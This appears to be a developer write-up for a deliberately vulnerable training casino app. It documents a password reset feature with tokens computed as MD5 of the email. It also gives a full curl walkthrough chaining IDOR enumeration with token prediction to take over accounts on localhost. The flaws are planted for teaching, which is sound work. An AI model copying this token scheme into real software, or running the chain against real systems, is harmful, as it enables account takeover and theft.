# Password Reset Implementation - A02: Cryptographic Failures

## Overview

This document describes the implementation of the password reset functionality with an **intentional A02 vulnerability** (Cryptographic Failures) using weak MD5 token generation.

## Implementation Summary

### Backend (Go)

**Files Modified:**
1. `casino-back/internal/database/db.go` - Added `password_reset_tokens` table
2. `casino-back/internal/models/user.go` - Added password reset models
3. `casino-back/cmd/api/main.go` - Registered 3 new routes

**Files Created:**
4. `casino-back/internal/handlers/password_reset.go` - **NEW** - Password reset handlers

**Database Schema:**
```sql
CREATE TABLE IF NOT EXISTS password_reset_tokens (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    user_id INTEGER NOT NULL,
    token TEXT NOT NULL UNIQUE,
    email TEXT NOT NULL,
    created_at DATETIME DEFAULT CURRENT_TIMESTAMP,
    FOREIGN KEY (user_id) REFERENCES users(id) ON DELETE CASCADE
);
```

**API Endpoints:**
- `POST /api/auth/forgot-password` - Request password reset (generates MD5 token)
- `GET /api/auth/reset-password/:token` - Verify token and get email
- `POST /api/auth/reset-password` - Reset password with token

### Frontend (React)

**Files Modified:**
1. `ruleta/app/routes/login.tsx` - Added "Forgot Password?" link
2. `ruleta/app/routes.ts` - Registered 2 new routes

**Files Created:**
3. `ruleta/app/routes/forgot-password.tsx` - **NEW** - Email submission page
4. `ruleta/app/routes/reset-password.tsx` - **NEW** - Password reset form
5. `ruleta/app/components/PasswordStrengthIndicator.tsx` - **NEW** - Reusable component

**Routes:**
- `/forgot-password` - Request password reset
- `/reset-password?token=xxx` - Reset password with token

## Vulnerability Details: A02 Cryptographic Failures

### The Vulnerability

**Location:** `casino-back/internal/handlers/password_reset.go:40-43`

```go
// VULNERABLE: Generate predictable MD5 token - A02 Cryptographic Failures
// This is intentional for educational purposes
// Attack: token = MD5(victim_email) - completely predictable if you know the email
token := fmt.Sprintf("%x", md5.Sum([]byte(req.Email)))
```

### Why This Is Vulnerable

1. **MD5 is cryptographically broken** - vulnerable to collisions and pre-image attacks
2. **Tokens are predictable** - if you know someone's email, you can calculate their token
3. **No randomness** - same email always produces the same token
4. **No expiration** - tokens never expire (as per requirements)
5. **No rate limiting** - attackers can generate unlimited tokens

### Attack Chain

This vulnerability is part of the OWASP Top 10 exploitation chain:

```
Step 1: IDOR (A01)
  → Enumerate user profiles via /api/user/profile/:id
  → Collect victim emails
  ↓
Step 2: Weak Crypto (A02) ← THIS VULNERABILITY
  → Calculate MD5(victim_email) to get reset token
  → Reset victim's password without email access
  → Account takeover achieved
  ↓
Step 3+: Further exploitation with compromised account
```

## Testing the Implementation

### Manual Testing via Browser

1. **Start servers:**
   ```bash
   # Terminal 1 - Backend
   cd casino-back
   go run cmd/api/main.go

   # Terminal 2 - Frontend
   cd ruleta
   npm run dev
   ```

2. **Access the application:** http://localhost:5174 (or 5173)

3. **Test the UI flow:**
   - Go to login page
   - Click "Forgot Password?" link
   - Enter email: `test@casino.com`
   - Submit form
   - Open browser console to see educational logs
   - Copy token from URL or calculate MD5
   - Navigate to: `/reset-password?token=<token>`
   - Enter new password (watch strength indicator)
   - Submit and verify redirect to login

### API Testing via cURL

**Step 1: Request password reset**
```bash
curl -X POST http://localhost:8080/api/auth/forgot-password \
  -H "Content-Type: application/json" \
  -d '{"email":"test@casino.com"}'
```

**Step 2: Calculate MD5 token (demonstrating the vulnerability)**
```bash
echo -n "test@casino.com" | md5sum
# Output: 4c8f1128b9dd5714bb86a142568af56b
```

**Step 3: Verify token**
```bash
curl http://localhost:8080/api/auth/reset-password/4c8f1128b9dd5714bb86a142568af56b
# Output: {"email":"test@casino.com"}
```

**Step 4: Reset password**
```bash
curl -X POST http://localhost:8080/api/auth/reset-password \
  -H "Content-Type: application/json" \
  -d '{"token":"4c8f1128b9dd5714bb86a142568af56b","new_password":"hacked123"}'
# Output: {"message":"Password reset successful"}
```

**Step 5: Verify new password works**
```bash
curl -X POST http://localhost:8080/api/login \
  -H "Content-Type: application/json" \
  -d '{"email":"test@casino.com","password":"hacked123"}'
# Output: {"message":"Login successful","token":"...","user":{...}}
```

## Exploitation Demo

### Scenario: Account Takeover via IDOR + Weak Crypto

**Attacker's Goal:** Compromise a high-value user account

**Attack Steps:**

1. **Enumerate users via IDOR (A01):**
   ```bash
   # Login as attacker
   curl -X POST http://localhost:8080/api/login \
     -H "Content-Type: application/json" \
     -d '{"email":"attacker@example.com","password":"pass123"}'

   # Get token, then enumerate profiles
   curl -H "Authorization: Bearer <token>" \
     http://localhost:8080/api/user/profile/1
   # Returns: {"email":"victim@casino.com","balance":5000,...}
   ```

2. **Generate predictable reset token (A02):**
   ```bash
   # Attacker knows victim's email from step 1
   TOKEN=$(echo -n "victim@casino.com" | md5sum | awk '{print $1}')
   echo "Victim's reset token: $TOKEN"
   ```

3. **Reset victim's password:**
   ```bash
   curl -X POST http://localhost:8080/api/auth/reset-password \
     -H "Content-Type: application/json" \
     -d "{\"token\":\"$TOKEN\",\"new_password\":\"pwned123\"}"
   ```

4. **Login as victim:**
   ```bash
   curl -X POST http://localhost:8080/api/login \
     -H "Content-Type: application/json" \
     -d '{"email":"victim@casino.com","password":"pwned123"}'
   # Attacker now has full access to victim's account and balance
   ```

## Educational Console Logging

The frontend implementation includes educational console logging in `reset-password.tsx` (lines 44-51):

```typescript
console.log("%c🔓 VULNERABLE: A02 Cryptographic Failures", "color: #ff6b6b; font-weight: bold;");
console.log("%cThis token was generated using MD5(email):", "color: #ffd93d; font-weight: bold;");
console.log(`%cEmail: ${data.email}`, "color: #6bcf7f;");
console.log(`%cToken: ${token}`, "color: #6bcf7f;");
console.log("%cAttack: If you know someone's email (via IDOR), you can generate their reset token!", "color: #ff6b6b;");
console.log(`%cProof: MD5("${data.email}") = ${token}`, "color: #ffd93d;");
```

When a user accesses the reset password page, they'll see color-coded educational messages in the browser console explaining the vulnerability.

## Frontend UX Features

### Forgot Password Page
- Purple-themed design (distinct from login's yellow theme)
- Generic success message (prevents email enumeration)
- Educational note about console logs
- Error handling for invalid emails
- Loading states during submission

### Reset Password Page
- Blue-themed design (distinct from other auth pages)
- Token verification on page load
- Email display (read-only, fetched from backend)
- Password strength indicator with criteria checklist
- Show/hide password toggle
- Real-time validation (passwords match, minimum length)
- Auto-redirect to login after 3 seconds on success
- Graceful error handling for invalid/expired tokens

### Password Strength Indicator
- Visual progress bar (red → yellow → green)
- Three criteria:
  - At least 6 characters
  - Contains a number
  - Contains a letter
- Real-time feedback as user types
- Accessible (ARIA labels, screen reader friendly)

## Security Notes

### Intentional Vulnerabilities (Educational)

This implementation contains the following intentional security flaws:

1. **MD5 Token Generation** - Cryptographically weak, predictable
2. **No Token Expiration** - Tokens remain valid indefinitely
3. **No Rate Limiting** - Unlimited password reset requests allowed
4. **Multiple Tokens Allowed** - No cleanup of old tokens

### Secure Alternatives (NOT Implemented)

For reference, a secure implementation would include:

1. **Cryptographically Secure Random Tokens:**
   ```go
   import "crypto/rand"
   tokenBytes := make([]byte, 32)
   rand.Read(tokenBytes)
   token := base64.URLEncoding.EncodeToString(tokenBytes)
   ```

2. **Token Expiration:**
   ```go
   expiresAt := time.Now().Add(1 * time.Hour)
   // Check expiration before accepting token
   ```

3. **Single-Use Tokens:**
   ```go
   // Delete token immediately after verification (already implemented)
   // But also check expiration to prevent reuse
   ```

4. **Rate Limiting:**
   ```go
   // Limit password reset requests per email per hour
   // Example: Max 3 requests per email per hour
   ```

5. **Email Delivery:**
   ```go
   // Actually send reset link via email
   // Don't return token in API response
   ```

## Project Status

All implementation tasks completed:

- ✅ Database schema updated
- ✅ Backend models created
- ✅ Backend handlers with MD5 vulnerability implemented
- ✅ Routes registered
- ✅ Frontend forgot password page created
- ✅ Frontend reset password page created
- ✅ Password strength indicator component created
- ✅ Login page updated with forgot password link
- ✅ Routes configuration updated
- ✅ Complete flow tested and verified

## Running Servers

Both servers are currently running:

- **Backend:** http://localhost:8080
- **Frontend:** http://localhost:5174

You can now test the complete password reset flow via the browser or API.

## Next Steps

To continue building the vulnerability chain:

1. **A03: Injection (SQL Injection)** - Implement vulnerable `/bets?filter=` endpoint
2. **A04: Insecure Design (Race Condition)** - Already partially implemented in balance endpoints

The current implementation successfully demonstrates A02 (Cryptographic Failures) and integrates with the existing A01 (IDOR) vulnerability for a complete account takeover attack chain.
